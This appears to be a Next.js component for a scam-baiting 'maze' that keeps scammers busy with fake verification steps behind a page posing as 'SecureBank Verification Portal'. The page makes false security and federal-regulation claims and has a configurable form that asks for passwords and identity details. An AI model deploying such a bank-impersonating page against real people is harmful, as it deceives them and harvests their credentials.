'use client';

import { useState, useEffect } from 'react';
import { useParams } from 'next/navigation';
import { 
  Shield, 
  Lock, 
  CheckCircle, 
  Clock, 
  AlertTriangle,
  FileText,
  Image,
  Calculator,
  Eye,
  EyeOff
} from 'lucide-react';

interface MazeData {
  id: string;
  name: string;
  currentTrialId: string;
  currentTrial: {
    kind: string;
    config: any;
  };
  progress: {
    completed: number;
    total: number;
  };
}

export default function ScammerPortal() {
  const params = useParams();
  const slug = params.slug as string;
  
  const [mazeData, setMazeData] = useState<MazeData | null>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [currentAnswer, setCurrentAnswer] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [timeRemaining, setTimeRemaining] = useState(0);
  const [formData, setFormData] = useState<Record<string, string>>({});

  useEffect(() => {
    initializeSession();
  }, [slug]);

  useEffect(() => {
    let interval: NodeJS.Timeout;
    if (timeRemaining > 0) {
      interval = setInterval(() => {
        setTimeRemaining(prev => prev - 1);
      }, 1000);
    }
    return () => clearInterval(interval);
  }, [timeRemaining]);

  const initializeSession = async () => {
    try {
      const response = await fetch(`/api/portal/${slug}/start`, {
        method: 'POST',
      });
      
      if (response.ok) {
        const data = await response.json();
        setMazeData(data.maze);
        setSessionId(data.sessionId);
        
        // Set timer if current trial has time limit
        if (data.maze.currentTrial.config.timeLimit) {
          setTimeRemaining(data.maze.currentTrial.config.timeLimit);
        }
      } else {
        setError('Portal not found or inactive');
      }
    } catch (error) {
      setError('Failed to connect to verification portal');
    } finally {
      setLoading(false);
    }
  };

  const submitAnswer = async () => {
    if (!sessionId || !mazeData) return;

    try {
      const response = await fetch(`/api/portal/${slug}/submit`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId,
          trialId: mazeData.currentTrialId,
          answer: currentAnswer,
          formData,
        }),
      });

      const result = await response.json();
      
      if (result.success) {
        // Move to next trial
        setMazeData(result.maze);
        setCurrentAnswer('');
        setFormData({});
        
        // Set timer for new trial
        if (result.maze.currentTrial.config.timeLimit) {
          setTimeRemaining(result.maze.currentTrial.config.timeLimit);
        } else {
          setTimeRemaining(0);
        }
      } else {
        setError(result.error || 'Please check your answer and try again');
      }
    } catch (error) {
      setError('Verification failed. Please try again.');
    }
  };

  const renderTrial = () => {
    if (!mazeData) return null;

    const trial = mazeData.currentTrial;
    const config = trial.config;

    switch (trial.kind) {
      case 'image_hunt':
        return renderImageHunt(config);
      case 'form_fill':
        return renderFormFill(config);
      case 'calculation':
        return renderCalculation(config);
      case 'wait_timer':
        return renderWaitTimer(config);
      case 'captcha':
        return renderCaptcha(config);
      default:
        return <div>Unknown verification step</div>;
    }
  };

  const renderImageHunt = (config: any) => (
    <div className="space-y-6">
      <div className="text-center">
        <Image className="h-12 w-12 text-blue-600 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Visual Verification</h2>
        <p className="text-gray-600">
          For security purposes, please identify the following items in the image below:
        </p>
      </div>

      <div className="bg-gray-100 p-8 rounded-lg text-center">
        <div className="bg-white p-4 rounded border">
          {/* Placeholder for image */}
          <div className="h-64 bg-gray-200 rounded flex items-center justify-center">
            <span className="text-gray-500">Security Image Loading...</span>
          </div>
        </div>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">
          Items to find: {config.targetItems?.join(', ')}
        </label>
        <textarea
          value={currentAnswer}
          onChange={(e) => setCurrentAnswer(e.target.value)}
          className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          rows={3}
          placeholder="Describe the location of each item..."
        />
      </div>
    </div>
  );

  const renderFormFill = (config: any) => (
    <div className="space-y-6">
      <div className="text-center">
        <FileText className="h-12 w-12 text-blue-600 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Account Verification</h2>
        <p className="text-gray-600">
          Please provide the following information to verify your identity:
        </p>
      </div>

      <div className="space-y-4">
        {config.fields?.map((field: string, index: number) => (
          <div key={index}>
            <label className="block text-sm font-medium text-gray-700 mb-1">
              {field} <span className="text-red-500">*</span>
            </label>
            <input
              type={field.toLowerCase().includes('password') ? (showPassword ? 'text' : 'password') : 'text'}
              value={formData[field] || ''}
              onChange={(e) => setFormData({ ...formData, [field]: e.target.value })}
              className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder={`Enter your ${field.toLowerCase()}`}
              required
            />
          </div>
        ))}
        
        {config.fields?.some((field: string) => field.toLowerCase().includes('password')) && (
          <div className="flex items-center">
            <input
              type="checkbox"
              id="showPassword"
              checked={showPassword}
              onChange={(e) => setShowPassword(e.target.checked)}
              className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
            />
            <label htmlFor="showPassword" className="ml-2 block text-sm text-gray-700">
              Show password
            </label>
          </div>
        )}
      </div>
    </div>
  );

  const renderCalculation = (config: any) => {
    const currentProblem = config.problems?.[0];
    
    return (
      <div className="space-y-6">
        <div className="text-center">
          <Calculator className="h-12 w-12 text-blue-600 mx-auto mb-4" />
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Security Verification</h2>
          <p className="text-gray-600">
            Please solve the following security questions to proceed:
          </p>
        </div>

        <div className="bg-blue-50 p-6 rounded-lg border border-blue-200">
          <div className="text-center">
            <div className="text-3xl font-mono mb-4">{currentProblem?.question}</div>
            <input
              type="number"
              value={currentAnswer}
              onChange={(e) => setCurrentAnswer(e.target.value)}
              className="w-32 px-3 py-2 border border-gray-300 rounded-md text-center text-xl focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Answer"
            />
          </div>
        </div>

        <div className="text-center text-sm text-gray-500">
          Question 1 of {config.problems?.length || 1}
        </div>
      </div>
    );
  };

  const renderWaitTimer = (config: any) => (
    <div className="space-y-6">
      <div className="text-center">
        <Clock className="h-12 w-12 text-blue-600 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Processing Verification</h2>
        <p className="text-gray-600">
          {config.message || 'Please wait while we verify your information...'}
        </p>
      </div>

      <div className="text-center">
        <div className="inline-flex items-center justify-center w-16 h-16 bg-blue-100 rounded-full mb-4">
          <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
        </div>
        <div className="text-2xl font-mono text-gray-700">
          {Math.floor(timeRemaining / 60)}:{(timeRemaining % 60).toString().padStart(2, '0')}
        </div>
        <div className="text-sm text-gray-500 mt-2">
          Estimated processing time
        </div>
      </div>

      {timeRemaining === 0 && (
        <div className="text-center">
          <button
            onClick={submitAnswer}
            className="px-6 py-3 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500"
          >
            Continue
          </button>
        </div>
      )}
    </div>
  );

  const renderCaptcha = (config: any) => (
    <div className="space-y-6">
      <div className="text-center">
        <Shield className="h-12 w-12 text-blue-600 mx-auto mb-4" />
        <h2 className="text-2xl font-bold text-gray-900 mb-2">Security Verification</h2>
        <p className="text-gray-600">
          Please complete the CAPTCHA to verify you are human:
        </p>
      </div>

      <div className="bg-gray-100 p-6 rounded-lg border">
        <div className="bg-white p-4 rounded border-2 border-dashed border-gray-300 text-center">
          <div className="h-20 flex items-center justify-center">
            <span className="text-gray-500">CAPTCHA Loading...</span>
          </div>
        </div>
        <input
          type="text"
          value={currentAnswer}
          onChange={(e) => setCurrentAnswer(e.target.value)}
          className="w-full mt-4 px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          placeholder="Enter the characters shown above"
        />
      </div>
    </div>
  );

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Connecting to secure verification portal...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center max-w-md">
          <AlertTriangle className="h-16 w-16 text-red-500 mx-auto mb-4" />
          <h1 className="text-2xl font-bold text-gray-900 mb-2">Access Denied</h1>
          <p className="text-gray-600 mb-6">{error}</p>
          <button
            onClick={() => window.location.reload()}
            className="px-6 py-3 bg-blue-600 text-white rounded-md hover:bg-blue-700"
          >
            Try Again
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-white border-b shadow-sm">
        <div className="max-w-4xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center">
              <Shield className="h-8 w-8 text-blue-600 mr-3" />
              <div>
                <h1 className="text-xl font-bold text-gray-900">SecureBank Verification Portal</h1>
                <p className="text-sm text-gray-600">Secure Identity Verification System</p>
              </div>
            </div>
            <div className="flex items-center space-x-2 text-sm text-gray-600">
              <Lock className="h-4 w-4" />
              <span>SSL Secured</span>
            </div>
          </div>
        </div>
      </header>

      {/* Progress Bar */}
      <div className="bg-white border-b">
        <div className="max-w-4xl mx-auto px-4 py-3">
          <div className="flex items-center justify-between mb-2">
            <span className="text-sm font-medium text-gray-700">Verification Progress</span>
            <span className="text-sm text-gray-600">
              {mazeData?.progress.completed || 0} of {mazeData?.progress.total || 1} steps
            </span>
          </div>
          <div className="w-full bg-gray-200 rounded-full h-2">
            <div 
              className="bg-blue-600 h-2 rounded-full transition-all duration-300"
              style={{ 
                width: `${((mazeData?.progress.completed || 0) / (mazeData?.progress.total || 1)) * 100}%` 
              }}
            ></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        <div className="bg-white rounded-lg shadow-sm border p-8">
          {renderTrial()}
          
          {error && (
            <div className="mt-6 p-4 bg-red-50 border border-red-200 rounded-md">
              <div className="flex items-center">
                <AlertTriangle className="h-5 w-5 text-red-500 mr-2" />
                <span className="text-red-700">{error}</span>
              </div>
            </div>
          )}

          {mazeData?.currentTrial.kind !== 'wait_timer' && (
            <div className="mt-8 flex justify-between items-center">
              <div className="text-sm text-gray-500">
                {timeRemaining > 0 && (
                  <span>Time remaining: {Math.floor(timeRemaining / 60)}:{(timeRemaining % 60).toString().padStart(2, '0')}</span>
                )}
              </div>
              <button
                onClick={submitAnswer}
                disabled={!currentAnswer && Object.keys(formData).length === 0}
                className="px-6 py-3 bg-blue-600 text-white rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                Continue Verification
              </button>
            </div>
          )}
        </div>

        {/* Security Footer */}
        <div className="mt-8 text-center text-sm text-gray-500">
          <div className="flex items-center justify-center space-x-4">
            <div className="flex items-center">
              <Lock className="h-4 w-4 mr-1" />
              <span>256-bit SSL Encryption</span>
            </div>
            <div className="flex items-center">
              <CheckCircle className="h-4 w-4 mr-1" />
              <span>Bank-Grade Security</span>
            </div>
          </div>
          <p className="mt-2">
            This verification process is required by federal banking regulations to protect your account.
          </p>
        </div>
      </main>
    </div>
  );
}